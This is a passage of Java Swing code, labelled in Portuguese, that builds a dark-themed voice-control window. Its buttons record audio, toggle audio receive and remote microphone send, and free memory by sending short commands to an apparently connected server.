                UIManager.put("nimbusSelectionBackground", new Color(104, 93, 156));
                UIManager.put("nimbusSelectedText", Color.WHITE);
                UIManager.put("nimbusDisabledText", Color.GRAY);
                UIManager.put("OptionPane.background", new Color(60, 63, 65));
                UIManager.put("Panel.background", new Color(60, 63, 65));
                UIManager.put("TextField.background", new Color(69, 73, 74));
                UIManager.put("TextField.foreground", Color.WHITE);
                UIManager.put("TextArea.background", new Color(69, 73, 74));
                UIManager.put("TextArea.foreground", Color.WHITE);
                UIManager.put("ComboBox.background", new Color(69, 73, 74));
                UIManager.put("ComboBox.foreground", Color.WHITE);
                UIManager.put("Button.background", new Color(77, 77, 77));
                UIManager.put("Button.foreground", Color.WHITE);
            }
        } catch (Exception ignored) {
        }

        if (AUDIO_CONTROL != null) {
            AUDIO_CONTROL.dispose();
        }

        // Cria o JFrame
        AUDIO_CONTROL = new JFrame("Controles de Voz");
        AUDIO_CONTROL.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        ImageIcon icon = null;
        try {
            icon = new ImageIcon(getClass().getResource("/eye.png"));
            AUDIO_CONTROL.setIconImage(icon.getImage());
        } catch (Exception e) {
            System.err.println("Não foi possível carregar a imagem: " + e.getMessage());
        }

        JPanel panel = new JPanel();
        if (DARK_MODE) {
            panel.setBackground(new Color(60, 63, 65));
        }
        panel.setLayout(new FlowLayout(FlowLayout.CENTER, 20, 20));

        JButton record = new JButton("Gravar Áudio");
        if (DARK_MODE) {
            record.setForeground(Color.WHITE);
        }

        configInputButton(record, "Gravar Áudio Temporário", "audio", "Segundos:");
        panel.add(record);

        AUDIO_USER = new JButton("Áudio");
        if (ServerAudioComponents.AUDIO_USER) {
            AUDIO_USER.setBackground(Color.GREEN);
        } else {
            AUDIO_USER.setBackground(Color.RED);
        }
        AUDIO_USER.setForeground(Color.WHITE);

        AUDIO_USER.addActionListener(event -> ConnectServer.handleCommand("audio receive"));
        panel.add(AUDIO_USER);

        AUDIO_SERVER = new JButton("Microfone");
        if (ServerAudioComponents.AUDIO_SERVER) {
            AUDIO_SERVER.setBackground(Color.GREEN);
        } else {
            AUDIO_SERVER.setBackground(Color.RED);
        }
        AUDIO_SERVER.setForeground(Color.WHITE);

        AUDIO_SERVER.addActionListener(event -> ConnectServer.handleCommand("audio send"));
        panel.add(AUDIO_SERVER);

        JButton gcButton = new JButton("Liberar Memória");
        if (DARK_MODE) {
            record.setForeground(Color.WHITE);
        }
        gcButton.addActionListener(e -> ConnectServerGUI.sendDirectCommand("gc"));
        panel.add(gcButton);

        AUDIO_CONTROL.setContentPane(panel);
        AUDIO_CONTROL.pack();
        AUDIO_CONTROL.setLocationRelativeTo(null);

        if (DARK_MODE) {
            SwingUtilities.updateComponentTreeUI(AUDIO_CONTROL);
        }

        AUDIO_CONTROL.setVisible(true);
        return AUDIO_CONTROL;
    }

    public static void toggleColor(JButton button, boolean enabled) {
        if (button == null) {
            return;
        }
        if (enabled) {
            button.setBackground(Color.GREEN);
        } else {
            button.setBackground(Color.RED);
        }
    }

}

